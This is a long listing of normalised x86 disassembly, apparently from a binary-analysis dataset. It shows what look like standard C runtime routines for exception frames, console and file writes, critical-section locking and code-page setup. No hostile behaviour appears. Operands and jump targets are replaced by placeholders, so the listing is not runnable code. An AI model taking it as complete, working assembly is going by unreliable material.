mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_1000be30
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_1000bec0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_1000f905
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_1000f924
jmp r-xdata
sub_1000bec0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_10008bf6
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_1000be30
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_1000bf22
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_1000bf52
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000bf82
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_1000bfd7
mov edi edi
push esi
call sub_1000d6e2
mov esi eax
push esi
call sub_1000a238
push esi
call sub_1000ab21
push esi
call sub_1000a723
push esi
call sub_10009a25
push esi
call sub_1000ea09
push esi
call sub_1000e2a9
add esp 0x18
pop esi
retn
sub_1000c00a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_1000c02e
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_1000f298
push r--data
push r--data
call sub_1000c00a
pop ecx
pop ecx
test eax eax
jne r-xdata
push rw-data
call sub_1000f730
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_1000e940
call sub_10009a0e
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_1000f730
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_1000c0c5
push 0x20
push r--data
call sub_1000bc40
push 0x8
call sub_1000cc92
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000c1f0
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_1000bc85
retn
mov [ rw-data ] 0x1
push 0x8
call sub_1000cbb9
pop ecx
push [ ebp + 0x8 ]
call sub_1000bfad
mov [ ebp - 0x20 ] r--data
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_1000d6e2
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_1000d6e2
mov [ edi ] eax
call ebx
push [ rw-data ]
call esi
mov ebx eax
push [ rw-data ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_1000c248
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_1000f970
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] edi
mov [ ebp - 0x1ad0 ] edi
cmp [ ebp + 0x10 ] edi
jne r-xdata
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x5
mov edi esi
push ebx
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
and edi 0x1f
shl edi 0x6
mov cl [ eax + edi + 0x24 ]
add cl cl
sar cl 0x1
mov [ ebp - 0x1adc ] ebx
mov [ ebp - 0x1ac1 ] cl
cmp cl 0x2
je r-xdata
call sub_1000a3d7
mov [ eax ] edi
call sub_1000a3c4
mov [ eax ] 0x16
call sub_1000acab
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10008bf6
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ eax + edi + 0x4 ] 0x20
je r-xdata
call sub_1000a3d7
and [ eax ] 0x0
call sub_1000a3c4
mov [ eax ] 0x16
call sub_1000acab
jmp r-xdata
push esi
call sub_1000f0bb
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_1000ef03
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ ebx ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop ebx
push ecx
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax + edi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac1 ] 0x0
mov [ ebp - 0x1abc ] ecx
jne r-xdata
call sub_1000d892
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae0 ]
sete cl
push eax
mov eax [ ebx ]
push [ edi + eax ]
mov esi ecx
call [ GetConsoleMode@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
mov eax [ ebp - 0x1ad8 ]
and [ ebp - 0x1abc ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
cmp [ ebp - 0x1ac1 ] 0x2
jne r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x80
je r-xdata
cmp esi ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1abc ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
mov ecx ebx
xor esi esi
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae0 ] eax
xor eax eax
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
cmp [ ebp - 0x1ac1 ] cl
je r-xdata
push 0x5
pop esi
cmp [ ebp - 0x1abc ] esi
jne r-xdata
mov ecx [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
and [ ebp - 0x1ac0 ] 0x0
mov ecx ebx
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x1ab8 ]
pop esi
call sub_1000a3c4
mov [ eax ] 0x1c
call sub_1000a3d7
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov dl [ ebx ]
inc ebx
inc ecx
mov [ ebp - 0x1ae0 ] ebx
cmp dl 0xa
jne r-xdata
mov [ ebp - 0x1ac0 ] eax
push [ ebp - 0x1abc ]
call sub_1000a3ea
pop ecx
jmp r-xdata
call sub_1000a3c4
mov [ eax ] 0x9
call sub_1000a3d7
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1ad4 ]
movzx edx [ edx ]
add [ ebp - 0x1ad4 ] esi
add ecx esi
cmp edx 0xa
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx edx [ ebx ]
add ebx esi
add ecx esi
mov [ ebp - 0x1ae0 ] ebx
cmp edx 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
mov [ eax ] dl
inc eax
inc esi
cmp esi 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc esi
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1adc ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae4 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] esi
push 0xd
pop ebx
mov [ eax ] bx
mov ebx [ ebp - 0x1ae0 ]
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
movzx esi [ ebx ]
xor ecx ecx
cmp esi 0xa
sete cl
add ebx 0x2
add [ ebp - 0x1ac0 ] 0x2
mov [ ebp - 0x1abc ] esi
mov [ ebp - 0x1ae4 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_1000dcdb
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
add esi [ ebp - 0x1ad8 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1abc ]
call sub_1000f927
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1abc ]
push eax
call sub_1000f3d1
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1ad4 ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1ac0 ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1abc ]
push ecx
push eax
push [ ebp - 0x1ae0 ]
inc ebx
inc [ ebp - 0x1ac0 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1abc ]
push ebx
push eax
call sub_1000f3d1
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1abc ] eax
call sub_1000f927
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
mov al [ ebp - 0x1ac1 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1ac0 ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1ac0 ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
mov [ ebp - 0x1ac8 ] eax
cmp [ ebp - 0x1ad4 ] esi
jl r-xdata
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ad4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_1000c945
push 0x10
push r--data
call sub_1000bc40
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_1000a3d7
and [ eax ] 0x0
call sub_1000a3c4
mov [ eax ] 0x9
call sub_1000a3d7
and [ eax ] 0x0
call sub_1000a3c4
mov [ eax ] 0x9
call sub_1000acab
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_1000bc85
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_1000fa8a
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1000a3c4
mov [ eax ] 0x9
call sub_1000a3d7
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_1000c248
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000ca11
mov eax [ ebp - 0x1c ]
sub_1000ca19
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_1000a3c4
mov [ eax ] 0x16
call sub_1000acab
or eax 0xffffffff
pop ebp
retn
sub_1000ca3f
push 0x10
push r--data
call sub_1000bc40
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_1000a3c4
mov [ eax ] 0x9
call sub_1000a3c4
mov [ eax ] 0x9
call sub_1000acab
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_1000bc85
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ esi + eax + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_1000fa8a
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_1000a3c4
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_1000fa21
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000cb10
mov eax [ ebp - 0x1c ]
call sub_1000a3d7
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_1000cb18
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_1000cb62
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_10009181
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_1000cbd0
push 0xc
push r--data
call sub_1000bc40
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_1000a6ea
push 0x1e
call sub_1000a53b
push 0xff
call sub_1000bfad
push 0x18
call sub_1000dbc4
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_1000cc92
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_1000a3c4
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_1000bc85
retn
push edi
call sub_10009181
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_10009181
pop ecx
call sub_1000a3c4
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000cc89
mov eax [ ebp - 0x1c ]
sub_1000cc92
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_1000cbd0
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_1000c22a
sub_1000ccc5
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_1000ccf4
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_1000a740
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_1000cd58
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_1000fe64
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_1000fd37
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_1000fd37
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10008bf6
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_1000a740
add esp 0xc
mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_1000cee8
push 0xc
push r--data
call sub_1000bc40
call sub_1000d892
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_1000cc92
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000cf83
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_1000bc85
retn
push 0x20
call sub_1000c22a
cmp esi rw-data
je r-xdata
push esi
call sub_10009181
pop ecx
sub_1000cf8c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_100095af
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_1000d008
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_1000cf8c
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_1000ccf4
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_1000a740
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008bf6
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
